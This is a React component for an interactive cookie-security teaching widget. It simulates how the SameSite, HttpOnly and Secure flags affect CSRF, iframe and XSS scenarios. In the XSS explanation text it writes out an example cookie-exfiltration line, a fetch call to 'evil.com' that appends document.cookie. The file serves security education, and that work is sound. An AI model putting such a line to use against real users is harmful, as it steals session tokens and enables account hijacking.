'use client';

import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Cookie, Shield, Lock, EyeOff, AlertTriangle, CheckCircle2, XCircle } from 'lucide-react';

export function CookieSecurity() {
  const [httpOnly, setHttpOnly] = useState(true);
  const [secure, setSecure] = useState(true);
  const [sameSite, setSameSite] = useState<'Strict' | 'Lax' | 'None'>('Lax');
  const [scenario, setScenario] = useState<'link' | 'post' | 'iframe' | 'xss'>('link');

  // Evaluate scenarios based on cookie flags
  const evaluateAccess = () => {
    if (scenario === 'xss') {
      return {
        accessible: !httpOnly,
        title: 'JavaScript document.cookie access',
        detail: httpOnly
          ? 'BLOCKED: HttpOnly prevents client scripts from reading this cookie. XSS cannot exfiltrate this session token directly.'
          : 'COMPROMISED: Without HttpOnly, malicious JavaScript injected via XSS can execute `fetch("evil.com?c=" + document.cookie)` and hijack the session.',
        safe: httpOnly,
      };
    }

    if (scenario === 'link') {
      // Top-level navigation
      if (sameSite === 'Strict') {
        return {
          accessible: false,
          title: 'Top-Level Link Navigation (evil.com -> bank.com)',
          detail: 'WITHHELD: SameSite=Strict withholds cookies on cross-site navigations. The user opens the link as an unauthenticated guest until next same-site interaction.',
          safe: true,
        };
      }
      return {
        accessible: true,
        title: 'Top-Level Link Navigation (evil.com -> bank.com)',
        detail: 'ATTACHED: Both SameSite=Lax and SameSite=None send cookies on top-level safe GET navigations.',
        safe: true,
      };
    }

    if (scenario === 'post') {
      // Cross-site form POST
      if (sameSite === 'Strict' || sameSite === 'Lax') {
        return {
          accessible: false,
          title: 'Cross-Site Form POST (Classic CSRF Vector)',
          detail: `BLOCKED BY BROWSER: SameSite=${sameSite} completely strips cookies from cross-site POST/PUT/DELETE requests. CSRF attacks are prevented!`,
          safe: true,
        };
      }
      return {
        accessible: true,
        title: 'Cross-Site Form POST (Classic CSRF Vector)',
        detail: 'VULNERABLE: SameSite=None sends cookies on cross-site POSTs! If the backend lacks Anti-CSRF tokens, the forged request succeeds.',
        safe: false,
      };
    }

    if (scenario === 'iframe') {
      // Cross-site iframe embedding
      if (sameSite === 'Strict' || sameSite === 'Lax') {
        return {
          accessible: false,
          title: 'Cross-Origin <iframe> Subresource Request',
          detail: `WITHHELD: SameSite=${sameSite} blocks cookies inside cross-origin iframes.`,
          safe: true,
        };
      }
      return {
        accessible: true,
        title: 'Cross-Origin <iframe> Subresource Request',
        detail: 'ATTACHED: SameSite=None sends cookies inside cross-site iframes (requires Secure over HTTPS).',
        safe: false,
      };
    }

    return { accessible: false, title: '', detail: '', safe: true };
  };

  const result = evaluateAccess();

  return (
    <div className="bg-card border border-border rounded-xl p-6 sm:p-8 flex flex-col gap-6 w-full max-w-4xl mx-auto shadow-xs">
      <div className="flex items-center justify-between border-b border-border/60 pb-3">
        <div className="flex items-center gap-2">
          <Cookie className="h-5 w-5 text-amber-500" />
          <span className="text-xs font-mono font-bold uppercase tracking-wider text-muted-foreground">
            Interactive Cookie Security Inspector
          </span>
        </div>
        <div className="text-xs font-mono bg-muted px-2.5 py-1 rounded-md text-foreground">
          RFC 6265bis
        </div>
      </div>

      {/* Cookie Configurator */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        {/* SameSite */}
        <div className="bg-background border border-border/80 rounded-lg p-3 space-y-2">
          <label className="text-xs font-semibold text-foreground flex items-center justify-between">
            <span>SameSite Attribute</span>
            <span className="font-mono text-red-500 text-[11px]">{sameSite}</span>
          </label>
          <div className="grid grid-cols-3 gap-1">
            {(['Strict', 'Lax', 'None'] as const).map((mode) => (
              <button
                key={mode}
                onClick={() => setSameSite(mode)}
                className={`text-xs py-1.5 px-2 rounded font-medium transition-colors ${
                  sameSite === mode
                    ? 'bg-foreground text-background font-semibold shadow-xs'
                    : 'bg-muted/60 text-muted-foreground hover:bg-muted hover:text-foreground'
                }`}
              >
                {mode}
              </button>
            ))}
          </div>
          <p className="text-[11px] text-muted-foreground leading-tight">
            {sameSite === 'Strict' && 'Never sent on cross-site requests.'}
            {sameSite === 'Lax' && 'Sent only on top-level safe GET navigations.'}
            {sameSite === 'None' && 'Sent on all cross-site requests (requires Secure).'}
          </p>
        </div>

        {/* HttpOnly */}
        <div className="bg-background border border-border/80 rounded-lg p-3 space-y-2">
          <label className="text-xs font-semibold text-foreground flex items-center justify-between">
            <span>HttpOnly Flag</span>
            <span className={`text-[11px] font-bold ${httpOnly ? 'text-emerald-500' : 'text-rose-500'}`}>
              {httpOnly ? 'ENABLED' : 'DISABLED'}
            </span>
          </label>
          <button
            onClick={() => setHttpOnly(!httpOnly)}
            className={`w-full py-1.5 px-3 rounded text-xs font-semibold transition-colors flex items-center justify-center gap-1.5 ${
              httpOnly
                ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/30'
                : 'bg-rose-500/10 text-rose-500 border border-rose-500/30'
            }`}
          >
            <EyeOff className="h-3.5 w-3.5" />
            <span>{httpOnly ? 'Guarded from JS' : 'Exposed to JS'}</span>
          </button>
          <p className="text-[11px] text-muted-foreground leading-tight">
            Prevents JavaScript reading via document.cookie.
          </p>
        </div>

        {/* Secure */}
        <div className="bg-background border border-border/80 rounded-lg p-3 space-y-2">
          <label className="text-xs font-semibold text-foreground flex items-center justify-between">
            <span>Secure Flag</span>
            <span className={`text-[11px] font-bold ${secure ? 'text-emerald-500' : 'text-amber-500'}`}>
              {secure ? 'HTTPS ONLY' : 'PLAIN HTTP'}
            </span>
          </label>
          <button
            onClick={() => setSecure(!secure)}
            className={`w-full py-1.5 px-3 rounded text-xs font-semibold transition-colors flex items-center justify-center gap-1.5 ${
              secure
                ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/30'
                : 'bg-amber-500/10 text-amber-500 border border-amber-500/30'
            }`}
          >
            <Lock className="h-3.5 w-3.5" />
            <span>{secure ? 'Encrypted Wire' : 'Cleartext Permitted'}</span>
          </button>
          <p className="text-[11px] text-muted-foreground leading-tight">
            Transmitted only over HTTPS connections.
          </p>
        </div>
      </div>

      {/* Generated Set-Cookie Header */}
      <div className="rounded-lg bg-zinc-950 p-3 font-mono text-xs text-zinc-100 overflow-x-auto">
        <span className="text-zinc-500">Set-Cookie: </span>
        <span className="text-cyan-400">session_token=k9f02a83; </span>
        <span className="text-amber-400">Path=/; </span>
        <span className="text-purple-400">SameSite={sameSite}; </span>
        {secure && <span className="text-emerald-400">Secure; </span>}
        {httpOnly && <span className="text-blue-400">HttpOnly; </span>}
      </div>

      {/* Test Scenarios */}
      <div className="space-y-3">
        <div className="text-xs font-bold uppercase tracking-wider text-muted-foreground">
          Simulate Browser Request Scenario:
        </div>
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
          {[
            { id: 'link', label: '1. External Link Click' },
            { id: 'post', label: '2. Forged Form POST' },
            { id: 'iframe', label: '3. Iframe Embed' },
            { id: 'xss', label: '4. XSS Script Read' },
          ].map((btn) => (
            <button
              key={btn.id}
              onClick={() => setScenario(btn.id as 'link' | 'post' | 'iframe' | 'xss')}
              className={`p-2 rounded-lg text-xs font-semibold border transition-all text-left ${
                scenario === btn.id
                  ? 'border-red-500 bg-red-500/10 text-foreground shadow-xs'
                  : 'border-border/60 bg-background text-muted-foreground hover:bg-muted hover:text-foreground'
              }`}
            >
              {btn.label}
            </button>
          ))}
        </div>
      </div>

      {/* Real-time Scenario Evaluation Output */}
      <motion.div
        key={`${scenario}-${sameSite}-${httpOnly}-${secure}`}
        initial={{ opacity: 0, y: 6 }}
        animate={{ opacity: 1, y: 0 }}
        className={`rounded-xl border p-4 sm:p-5 flex items-start gap-3 ${
          result.safe
            ? 'border-emerald-500/30 bg-emerald-500/5'
            : 'border-rose-500/30 bg-rose-500/5'
        }`}
      >
        {result.safe ? (
          <CheckCircle2 className="h-5 w-5 text-emerald-500 shrink-0 mt-0.5" />
        ) : (
          <AlertTriangle className="h-5 w-5 text-rose-500 shrink-0 mt-0.5" />
        )}
        <div className="space-y-1">
          <div className="text-sm font-bold text-foreground">{result.title}</div>
          <div className="text-xs sm:text-sm text-foreground/80 leading-relaxed">
            {result.detail}
          </div>
        </div>
      </motion.div>
    </div>
  );
}
